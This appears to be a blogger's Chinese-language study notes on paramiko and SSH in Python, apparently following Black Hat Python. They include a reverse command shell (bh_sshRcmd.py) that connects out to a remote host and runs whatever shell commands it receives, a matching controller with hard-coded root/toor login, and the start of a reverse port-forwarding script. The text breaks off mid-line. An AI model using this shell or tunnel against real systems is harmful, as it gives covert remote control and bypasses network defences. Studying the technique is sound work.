<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">&gt;&gt;&gt; c.connect((&#x27;127.0.0.1&#x27;,9988))</span><br><span class="line">&gt;&gt;&gt; c.send(b&#x27;wow&#x27;)</span><br><span class="line">3</span><br><span class="line">&gt;&gt;&gt; c.shutdown(socket.SHUT_WR)</span><br><span class="line">&gt;&gt;&gt; s = c.recv(4096)</span><br><span class="line">&gt;&gt;&gt; s</span><br><span class="line">b&#x27;ACK!&#x27;</span><br></pre></td></tr></table></figure>
<h3 id="paramiko-用python操作SSH">paramiko: 用python操作SSH</h3>
<p>先啟動WSL2的sshd</p>
<ol>
<li>改<code>/etc/ssh/sshd_config</code></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Port = 22</span><br><span class="line">ListenAddress 0.0.0.0</span><br><span class="line">PasswordAuthentication yes</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>重新啟動sshd</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dpkg-reconfigure openssh-server</span><br><span class="line">sudo service ssh restart 	</span><br></pre></td></tr></table></figure>
<p>ssh_command.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssh_command</span>(<span class="params">ip, user, passwd, command</span>):</span></span><br><span class="line">    client = paramiko.SSHClient()</span><br><span class="line">    <span class="comment"># client can also support using key files</span></span><br><span class="line">    <span class="comment"># client.load_host_keys(&#x27;/home/user/.ssh/known_hosts&#x27;)</span></span><br><span class="line">    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">    client.connect(ip, username=user, password=passwd)</span><br><span class="line">    ssh_session = client.get_transport().open_session()</span><br><span class="line">    <span class="keyword">if</span> ssh_session.active:</span><br><span class="line">        ssh_session.exec_command(command)</span><br><span class="line">        <span class="built_in">print</span>(ssh_session.recv(<span class="number">1024</span>))</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">ssh_command(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="string">&#x27;justin&#x27;</span>, <span class="string">&#x27;lovesthepython&#x27;</span>, <span class="string">&#x27;ls -al&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>連線的流程：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SSHClient(new client) -&gt; connect [ip,(account, pw)] -&gt; get_transport -&gt; open_session</span><br><span class="line">類比</span><br><span class="line">socket (SOCK_STREAM) -&gt; connect((ip, port)) -&gt; [Nope] -&gt; accept</span><br></pre></td></tr></table></figure>
<hr>
<p>bh_sshRcmd.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssh_command</span>(<span class="params">ip, user, passwd, command</span>):</span></span><br><span class="line">    client = paramiko.SSHClient()</span><br><span class="line">    <span class="comment"># client can also support using key files</span></span><br><span class="line">    <span class="comment"># client.load_host_keys(&#x27;/home/user/.ssh/known_hosts&#x27;)</span></span><br><span class="line">    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">    client.connect(ip, username=user, password=passwd)</span><br><span class="line">    ssh_session = client.get_transport().open_session()</span><br><span class="line">    <span class="keyword">if</span> ssh_session.active:</span><br><span class="line">        ssh_session.send(command)<span class="comment"># 這個其實可以不用</span></span><br><span class="line">        <span class="built_in">print</span>(ssh_session.recv(<span class="number">1024</span>))  <span class="comment"># read banner</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">## === new ===</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># get the command from the SSH server</span></span><br><span class="line">            command = ssh_session.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                cmd_output = subprocess.check_output(command, shell=<span class="literal">True</span>)</span><br><span class="line">                ssh_session.send(cmd_output)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                ssh_session.send(<span class="built_in">str</span>(e))</span><br><span class="line">	<span class="comment">## === new end ===</span></span><br><span class="line">    client.close()</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">ssh_command(<span class="string">&#x27;192.168.100.130&#x27;</span>, <span class="string">&#x27;justin&#x27;</span>, <span class="string">&#x27;lovesthepython&#x27;</span>, <span class="string">&#x27;ClientConnected&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>現在是在<code>bh_sshRcmd.py</code>執行指令再塞回去，這邊就是reverse tunnel的fu<br>
不過這要能運作要配合下面的code</p>
<hr>
<p>bh_sshserver.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># using the server host key from the paramiko demo files</span></span><br><span class="line">host_key = paramiko.RSAKey(filename=<span class="string">&#x27;test_rsa.key&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Server</span>(<span class="params">paramiko.ServerInterface</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.event = threading.Event()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_channel_request</span>(<span class="params">self, kind, chanid</span>):</span></span><br><span class="line">        <span class="keyword">if</span> kind == <span class="string">&#x27;session&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> paramiko.OPEN_SUCCEEDED</span><br><span class="line">        <span class="keyword">return</span> paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_auth_password</span>(<span class="params">self, username, password</span>):</span></span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&#x27;root&#x27;</span> <span class="keyword">and</span> password == <span class="string">&#x27;toor&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> paramiko.AUTH_SUCCESSFUL</span><br><span class="line">        <span class="keyword">return</span> paramiko.AUTH_FAILED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">server = sys.argv[<span class="number">1</span>]</span><br><span class="line">ssh_port = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    sock.bind((server, ssh_port))</span><br><span class="line">    sock.listen(<span class="number">100</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Listening for connection...&quot;</span>)</span><br><span class="line">    client, addr = sock.accept()</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Listen failed: &quot;</span> + <span class="built_in">str</span>(e))</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Got a connection!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># noinspection PyTypeChecker</span></span><br><span class="line">    bhSession = paramiko.Transport(client)</span><br><span class="line">    bhSession.add_server_key(host_key)</span><br><span class="line">    server = Server()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        bhSession.start_server(server=server)</span><br><span class="line">    <span class="keyword">except</span> paramiko.SSHException:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] SSH negotiation failed.&quot;</span>)</span><br><span class="line">    chan = bhSession.accept(<span class="number">20</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Authenticated!&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(chan.recv(<span class="number">1024</span>)) <span class="comment"># 這段其實不用</span></span><br><span class="line">    chan.send(<span class="string">&quot;Welcome to bh_ssh!&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            command = <span class="built_in">input</span>(<span class="string">&quot;Enter command: &quot;</span>).strip(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> command != <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">                chan.send(command)</span><br><span class="line">                <span class="built_in">print</span>(chan.recv(<span class="number">1024</span>).decode(errors=<span class="string">&quot;ignore&quot;</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                chan.send(<span class="string">&quot;exit&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Exiting...&quot;</span>)</span><br><span class="line">                bhSession.close()</span><br><span class="line">                <span class="keyword">raise</span> Exception(<span class="string">&quot;exit&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            bhSession.close()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Caught exception: &quot;</span> + <span class="built_in">str</span>(e))</span><br><span class="line">            bhSession.close()</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>大概的流程是</p>
<ol>
<li>client連到server</li>
<li>server丟指令到client</li>
<li>client跑指令回傳結果</li>
</ol>
<p>這邊就是自幹reverse tunnel</p>
<hr>
<p>下面就是包好的版本<br>
要注意到因為目的是relay sshd的東西到server<br>
所以剛剛例子是跑指令的部分變成proxy的code</p>
<p><span class="exturl" data-url="aHR0cDovL3Jmb3J3YXJkLnB5">rforward.py<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Copyright (C) 2008  Robey Pointer &lt;robeypointer@gmail.com&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This file is part of paramiko.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Paramiko is free software; you can redistribute it and/or modify it under the</span></span><br><span class="line"><span class="comment"># terms of the GNU Lesser General Public License as published by the Free</span></span><br><span class="line"><span class="comment"># Software Foundation; either version 2.1 of the License, or (at your option)</span></span><br><span class="line"><span class="comment"># any later version.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Paramiko is distributed in the hope that it will be useful, but WITHOUT ANY</span></span><br><span class="line"><span class="comment"># WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR</span></span><br><span class="line"><span class="comment"># A PARTICULAR PURPOSE.  See the GNU Lesser General Public License for more</span></span><br><span class="line"><span class="comment"># details.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># You should have received a copy of the GNU Lesser General Public License</span></span><br><span class="line"><span class="comment"># along with Paramiko; if not, write to the Free Software Foundation, Inc.,</span></span><br><span class="line"><span class="comment"># 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA.</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Sample script showing how to do remote port forwarding over paramiko.</span></span><br><span class="line"><span class="string">This script connects to the requested SSH server and sets up remote port</span></span><br><span class="line"><span class="string">forwarding (the openssh -R option) from a remote port through a tunneled</span></span><br><span class="line"><span class="string">connection to a destination reachable from the local machine.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> getpass</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> select</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line">SSH_PORT = <span class="number">22</span></span><br><span class="line">DEFAULT_PORT = <span class="number">4000</span></span><br><span class="line"></span><br><span class="line">g_verbose = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handler</span>(<span class="params">chan, host, port</span>):</span></span><br><span class="line">    sock = socket.socket()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sock.connect((host, port)) <span class="comment"># 與剛剛的例子對比，原本是在這裡跑指令，不過這邊是連到另一台server</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        verbose(<span class="string">&quot;Forwarding request to %s:%d failed: %r&quot;</span> % (host, port, e))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    verbose(</span><br><span class="line">        <span class="string">&quot;Connected!  Tunnel open %r -&gt; %r -&gt; %r&quot;</span></span><br><span class="line">        % (chan.origin_addr, chan.getpeername(), (host, port))</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	<span class="comment"># chan(sshd) &lt;-&gt; sock(real server)</span></span><br><span class="line">        r, w, x = select.select([sock, chan], [], [])</span><br><span class="line">        <span class="keyword">if</span> sock <span class="keyword">in</span> r:</span><br><span class="line">            data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(data) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            chan.send(data)</span><br><span class="line">        <span class="keyword">if</span> chan <span class="keyword">in</span> r:</span><br><span class="line">            data = chan.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(data) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            sock.send(data)</span><br><span class="line">    chan.close()</span><br><span class="line">    sock.close()</span><br><span class="line">    verbose(<span class="string">&quot;Tunnel closed from %r&quot;</span> % (chan.origin_addr,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse_forward_tunnel</span>(<span class="params">server_port, remote_host, remote_port, transport</span>):</span></span><br><span class="line">    transport.request_port_forward(<span class="string">&quot;&quot;</span>, server_port) <span class="comment"># bind(&quot;0.0.0.0&quot;, server_port)</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        chan = transport.accept(<span class="number">1000</span>) <span class="comment"># accept 來自sshd的連線</span></span><br><span class="line">        <span class="keyword">if</span> chan <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        thr = threading.Thread(</span><br><span class="line">            target=handler, args=(chan, remote_host, remote_port)</span><br><span class="line">        )</span><br><span class="line">        thr.setDaemon(<span class="literal">True</span>)</span><br><span class="line">        thr.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verbose</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">if</span> g_verbose:</span><br><span class="line">        <span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HELP = <span class="string">&quot;&quot;&quot;\</span></span><br><span class="line"><span class="string">Set up a reverse forwarding tunnel across an SSH server, using paramiko. A</span></span><br><span class="line"><span class="string">port on the SSH server (given with -p) is forwarded across an SSH session</span></span><br><span class="line"><span class="string">back to the local machine, and out to a remote site reachable from this</span></span><br><span class="line"><span class="string">network. This is similar to the openssh -R option.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_host_port</span>(<span class="params">spec, default_port</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;parse &#x27;hostname:22&#x27; into a host and port, with the port optional&quot;&quot;&quot;</span></span><br><span class="line">    args = (spec.split(<span class="string">&quot;:&quot;</span>, <span class="number">1</span>) + [default_port])[:<span class="number">2</span>]</span><br><span class="line">    args[<span class="number">1</span>] = <span class="built_in">int</span>(args[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> args[<span class="number">0</span>], args[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_options</span>():</span></span><br><span class="line">    <span class="keyword">global</span> g_verbose</span><br><span class="line"></span><br><span class="line">    parser = OptionParser(</span><br><span class="line">        usage=<span class="string">&quot;usage: %prog [options] &lt;ssh-server&gt;[:&lt;server-port&gt;]&quot;</span>,</span><br><span class="line">        version=<span class="string">&quot;%prog 1.0&quot;</span>,</span><br><span class="line">        description=HELP,</span><br><span class="line">    )</span><br><span class="line">    parser.add_option(</span><br><span class="line">        <span class="string">&quot;-q&quot;</span>,</span><br><span class="line">        <span class="string">&quot;--quiet&quot;</span>,</span><br><span class="line">        action=<span class="string">&quot;store_false&quot;</span>,</span><br><span class="line">        dest=<span class="string">&quot;verbose&quot;</span>,</span><br><span class="line">        default=<span class="literal">True</span>,</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;squelch all informational output&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    parser.add_option(</span><br><span class="line">        <span class="string">&quot;-p&quot;</span>,</span><br><span class="line">        <span class="string">&quot;--remote-port&quot;</span>,</span><br><span class="line">        action=<span class="string">&quot;store&quot;</span>,</span><br><span class="line">        <span class="built_in">type</span>=<span class="string">&quot;int&quot;</span>,</span><br><span class="line">        dest=<span class="string">&quot;port&quot;</span>,</span><br><span class="line">        default=DEFAULT_PORT,</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;port on server to forward (default: %d)&quot;</span> % DEFAULT_PORT,</span><br><span class="line">    )</span><br><span class="line">    parser.add_option(</span><br><span class="line">        <span class="string">&quot;-u&quot;</span>,</span><br><span class="line">        <span class="string">&quot;--user&quot;</span>,</span><br><span class="line">        action=<span class="string">&quot;store&quot;</span>,</span><br><span class="line">        <span class="built_in">type</span>=<span class="string">&quot;string&quot;</span>,</span><br><span class="line">        dest=<span class="string">&quot;user&quot;</span>,</span><br><span class="line">        default=getpass.getuser(),</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;username for SSH authentication (default: %s)&quot;</span></span><br><span class="line">        % getpass.getuser(),</span><br><span class="line">    )</span><br><span class="line">    parser.add_option(</span><br><span class="line">        <span class="string">&quot;-K&quot;</span>,</span><br><span class="line">        <span class="string">&quot;--key&quot;</span>,</span><br><span class="line">        action=<span class="string">&quot;store&quot;</span>,</span><br><span class="line">        <span class="built_in">type</span>=<span class="string">&quot;string&quot;</span>,</span><br><span class="line">        dest=<span class="string">&quot;keyfile&quot;</span>,</span><br><span class="line">        default=<span class="literal">None</span>,</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;private key file to use for SSH authentication&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    parser.add_option(</span><br><span class="line">        <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;--no-key&quot;</span>,</span><br><span class="line">        action=<span class="string">&quot;store_false&quot;</span>,</span><br><span class="line">        dest=<span class="string">&quot;look_for_keys&quot;</span>,</span><br><span class="line">        default=<span class="literal">True</span>,</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;don&#x27;t look for or use a private key file&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    parser.add_option(</span><br><span class="line">        <span class="string">&quot;-P&quot;</span>,</span><br><span class="line">        <span class="string">&quot;--password&quot;</span>,</span><br><span class="line">        action=<span class="string">&quot;store_true&quot;</span>,</span><br><span class="line">        dest=<span class="string">&quot;readpass&quot;</span>,</span><br><span class="line">        default=<span class="literal">False</span>,</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;read password (for key or password auth) from stdin&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    parser.add_option(</span><br><span class="line">        <span class="string">&quot;-r&quot;</span>,</span><br><span class="line">        <span class="string">&quot;--remote&quot;</span>,</span><br><span class="line">        action=<span class="string">&quot;store&quot;</span>,</span><br><span class="line">        <span class="built_in">type</span>=<span class="string">&quot;string&quot;</span>,</span><br><span class="line">        dest=<span class="string">&quot;remote&quot;</span>,</span><br><span class="line">        default=<span class="literal">None</span>,</span><br><span class="line">        metavar=<span class="string">&quot;host:port&quot;</span>,</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;remote host and port to forward to&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    options, args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(args) != <span class="number">1</span>:</span><br><span class="line">        parser.error(<span class="string">&quot;Incorrect number of arguments.&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> options.remote 